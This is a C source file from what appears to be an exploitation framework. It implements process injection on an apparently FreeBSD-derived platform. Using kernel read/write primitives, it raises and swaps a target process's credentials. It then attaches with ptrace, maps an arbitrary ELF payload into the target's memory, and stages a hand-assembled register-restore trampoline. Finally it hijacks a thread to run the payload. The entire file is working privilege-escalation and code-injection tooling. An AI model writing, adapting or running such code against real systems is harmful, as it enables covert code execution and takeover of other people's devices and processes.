/*
 * High-Level Process Injection Implementation.
 *
 * Consumes kernel R/W and ptrace primitives to map an arbitrary ELF payload
 * into a remote target process and hijack a thread to execute it.
 */

#include "oops/inject.h"
#include "oops/krw.h"
#include "oops/freestd.h"
#include "oops/syscall.h"

static void build_restore_trampoline(uint8_t *code, size_t *code_len,
                                     const struct reg *r) {
    size_t idx = 0;
#define EMIT_MOVABS(reg_prefix, opcode, val)                                           \
    do {                                                                               \
        code[idx++] = (uint8_t)(reg_prefix);                                           \
        code[idx++] = (uint8_t)(opcode);                                               \
        uint64_t v = (uint64_t)(val);                                                  \
        memcpy(&code[idx], &v, 8);                                                     \
        idx += 8;                                                                      \
    } while (0)

    EMIT_MOVABS(0x48, 0xb8, r->r_rax);
    EMIT_MOVABS(0x48, 0xbb, r->r_rbx);
    EMIT_MOVABS(0x48, 0xb9, r->r_rcx);
    EMIT_MOVABS(0x48, 0xba, r->r_rdx);
    EMIT_MOVABS(0x48, 0xbe, r->r_rsi);
    EMIT_MOVABS(0x48, 0xbf, r->r_rdi);
    EMIT_MOVABS(0x48, 0xbd, r->r_rbp);
    EMIT_MOVABS(0x49, 0xb8, r->r_r8);
    EMIT_MOVABS(0x49, 0xb9, r->r_r9);
    EMIT_MOVABS(0x49, 0xba, r->r_r10);
    EMIT_MOVABS(0x49, 0xbb, r->r_r11);
    EMIT_MOVABS(0x49, 0xbc, r->r_r12);
    EMIT_MOVABS(0x49, 0xbd, r->r_r13);
    EMIT_MOVABS(0x49, 0xbe, r->r_r14);
    EMIT_MOVABS(0x49, 0xbf, r->r_r15);
    EMIT_MOVABS(0x48, 0xbc, r->r_rsp);

    /* pushq $imm32_low : 68 [4 bytes] */
    code[idx++] = 0x68;
    uint32_t rip_low = (uint32_t)(r->r_rip & 0xFFFFFFFF);
    memcpy(&code[idx], &rip_low, 4);
    idx += 4;

    /* movl $imm32_high, 0x4(%rsp) : c7 44 24 04 [4 bytes] */
    code[idx++] = 0xc7;
    code[idx++] = 0x44;
    code[idx++] = 0x24;
    code[idx++] = 0x04;
    uint32_t rip_high = (uint32_t)((r->r_rip >> 32) & 0xFFFFFFFF);
    memcpy(&code[idx], &rip_high, 4);
    idx += 4;

    /* ret : c3 */
    code[idx++] = 0xc3;

#undef EMIT_MOVABS
    *code_len = idx;
}

int oops_inject_elf(pid_t target_pid, const uint8_t *payload_data, size_t payload_size, payload_args_t *args) {
    if (payload_data == NULL || payload_size == 0 || args == NULL) {
        return -1;
    }
    if (target_pid <= 0) {
        return -2;
    }

    /* 1. Elevate target credentials and synchronize ucred before ptrace attach */
    klog_write("elevating target process credentials...");
    if (krw_elevate_process(target_pid) != 0) {
        klog_write("WARNING: krw_elevate_process failed");
    }
    if (krw_swap_ucred(target_pid) != 0) {
        klog_write("WARNING: krw_swap_ucred failed");
    } else {
        klog_write("ucred synchronized with target process");
    }

    /* 2. Pre-dump kernel export table BEFORE stopping target with ptrace */
    static obs_kexport_table_t s_kexport_table;
    klog_write("pre-dumping kernel export tables...");
    krw_dump_all_exports(target_pid, &s_kexport_table);

    /* 3. Attach to target process */
    klog_write_num("attaching ptrace to pid ", (int64_t)target_pid);
    if (procctl_attach(target_pid) != 0) {
        klog_write("ERROR: procctl_attach failed");
        krw_restore_ucred();
        return -3;
    }
    klog_write("ptrace attach success (target stopped)");

    /* 4. Read target thread registers */
    struct reg bak_reg;
    if (procctl_getregs(target_pid, &bak_reg) != 0) {
        klog_write("ERROR: procctl_getregs failed");
        procctl_detach(target_pid, 0);
        krw_restore_ucred();
        return -4;
    }
    klog_write_hex("target thread RIP=", bak_reg.r_rip);
    klog_write_hex("target thread RSP=", bak_reg.r_rsp);

    /* 5. Resolve target libkernel base and setup remote syscall gadget */
    uintptr_t target_kproc = krw_get_proc(target_pid);
    uintptr_t target_libkernel_base =
        krw_find_target_libkernel_base(target_kproc, (uintptr_t)bak_reg.r_rip);
    klog_write_hex("target libkernel_base=", target_libkernel_base);
    procctl_find_syscall_gadget(target_pid, target_libkernel_base);

    /* 6. Load ELF into target process address space */
    klog_write("mapping ELF segments into target process...");
    uintptr_t target_base = 0;
    size_t target_size = 0;
    uintptr_t entry_addr = loader_load_into_proc(
        target_pid, payload_data, payload_size, target_libkernel_base, &s_kexport_table,
        &target_base, &target_size);
    if (entry_addr == 0) {
        klog_write("ERROR: loader_load_into_proc failed");
        procctl_detach(target_pid, 0);
        krw_restore_ucred();
        return -5;
    }
    klog_write_hex("payload mapped, base=", target_base);
    klog_write_hex("payload mapped, entry=", entry_addr);

    /* 7. Setup dedicated stack + payload_args + kexport table in target process memory */
    uintptr_t alloc_remote =
        procctl_remote_mmap(target_pid, 0, 0x100000, PROC_PROT_READ | PROC_PROT_WRITE,
                            PROC_MAP_ANONYMOUS | PROC_MAP_PRIVATE, -1, 0);

    if (alloc_remote == 0) {
        klog_write("ERROR: remote_mmap for payload stack failed");
        procctl_detach(target_pid, 0);
        krw_restore_ucred();
        return -6;
    }

    uintptr_t kexport_remote = alloc_remote + 0x1000;
    size_t kexport_size =
        sizeof(uint32_t) * 2 + sizeof(obs_kexport_entry_t) * s_kexport_table.count;
    procctl_copyin(target_pid, &s_kexport_table, kexport_remote, kexport_size);
    klog_write_hex("kexport table staged at remote ", kexport_remote);

    uintptr_t args_remote = alloc_remote;
    payload_args_t target_args;
    memset(&target_args, 0, sizeof(target_args));
    if (target_libkernel_base != 0) {
        target_args.sys_dynlib_dlsym =
            (int (*)(int, const char *, void *))(target_libkernel_base + 0x5b0);
    }
    target_args.kpipe_addr = args->kpipe_addr;
    target_args.kdata_base_addr = args->kdata_base_addr;
    target_args.kexport_table = (void *)kexport_remote;
    procctl_copyin(target_pid, &target_args, args_remote, sizeof(target_args));
    klog_write_hex("payload_args staged at remote ", args_remote);

    /* Dedicated stack top (16-byte aligned) in upper half of 1MB region */
    uintptr_t stack_top = (alloc_remote + 0x100000 - 0x200) & ~0xFULL;
    /* Stage trampoline in a dedicated executable page */
    uintptr_t tramp_remote =
        procctl_remote_mmap(target_pid, 0, 0x4000, PROC_PROT_READ | PROC_PROT_WRITE,
                            PROC_MAP_ANONYMOUS | PROC_MAP_PRIVATE, -1, 0);
    uint8_t tramp_code[256];
    size_t tramp_len = 0;
    build_restore_trampoline(tramp_code, &tramp_len, &bak_reg);
    procctl_copyin(target_pid, tramp_code, tramp_remote, tramp_len);
    procctl_remote_mprotect(target_pid, tramp_remote, 0x4000, PROC_PROT_READ | PROC_PROT_EXEC);
    klog_write_hex("restore trampoline staged at ", tramp_remote);
    /* 8. Hijack target thread */
    struct reg jmp_reg;
    memcpy(&jmp_reg, &bak_reg, sizeof(jmp_reg));

    /* Push trampoline address onto dedicated stack as return address */
    jmp_reg.r_rsp = stack_top - 8;
    procctl_setlong(target_pid, jmp_reg.r_rsp, tramp_remote);

    jmp_reg.r_rip = entry_addr;
    jmp_reg.r_rdi = args_remote; /* First argument (SysV ABI): payload_args_t *args */

    klog_write_hex("hijacking thread: new RIP=", jmp_reg.r_rip);
    klog_write_hex("hijacking thread: new RSP=", jmp_reg.r_rsp);

    if (procctl_setregs(target_pid, &jmp_reg) != 0) {
        klog_write("ERROR: procctl_setregs failed");
        procctl_detach(target_pid, 0);
        krw_restore_ucred();
        return -7;
    }

    klog_write("registers set, resuming target...");

    /* 9. Detach while STILL ELEVATED to resume target */
    int detach_ret = procctl_detach(target_pid, 0);
    klog_write_num("detach return=", (int64_t)detach_ret);
    klog_write("injection complete! target process running payload.");

    return 0;
}
